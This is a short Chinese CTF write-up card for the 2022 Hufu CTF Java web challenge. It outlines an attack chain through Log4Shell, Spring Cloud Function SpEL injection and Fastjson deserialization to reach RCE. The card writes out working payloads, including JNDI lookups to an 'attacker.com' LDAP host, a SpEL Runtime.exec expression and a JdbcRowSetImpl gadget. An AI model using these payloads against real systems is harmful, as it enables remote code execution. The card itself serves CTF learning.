---
title: "2022 虎符 CTF - Java 部分"
category: web
tags: ["2022 虎符 CTF", "web", "虎符CTF", "Java", "Spring", "Fastjson"]
signals: ["2022 虎符 CTF 2022", "虎符CTF", "Java", "Spring", "Fastjson", "JNDI", "log4j", "Log4Shell", "Spring-cloud-function", "lfi", "rce", "web_unknown", "auth_bypass", "CTF"]
difficulty: hard
source: "https://www.ctfiot.com/31821.html"
tools: ["Java", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 虎符 CTF - Java 部分

> 赛事：2022 虎符 CTF 2022 | 方向：web | 难度：hard | 工具：Java、Spring

## 一句话总结

2022 虎符 CTF Java：log4j JNDI + Spring Cloud SpEL + Fastjson 反序列化

## 攻击链

1. 环境: docker-compose + nginx + web app + flag 挂载
2. Spring Boot 应用, 攻击面: Fastjson 反序列化 + Spring Cloud Function SpEL
3. Log4Shell: ${jndi:ldap://attacker/x} 触发 JNDI lookup
4. Spring Cloud Function SpEL: spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec(''id'')
5. Fastjson < 1.2.83 反序列化: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x","autoCommit":true}
6. RCE 出 flag

## 关键 payload

```
${jndi:ldap://attacker.com/Exploit}
```

## 经验教训

2021 年底 log4j Log4Shell 是 Java 生态最大 0day；Spring + Fastjson 是高频漏洞

## 标签

虎符CTF、Java、Spring、Fastjson、JNDI、log4j、Log4Shell、Spring-cloud-function、SpEL、nginx-conf、proxy_pass、docker-compose

## 参考来源

- https://www.ctfiot.com/31821.html
- 原文件：2022虎符CTF-Java部分.full.md
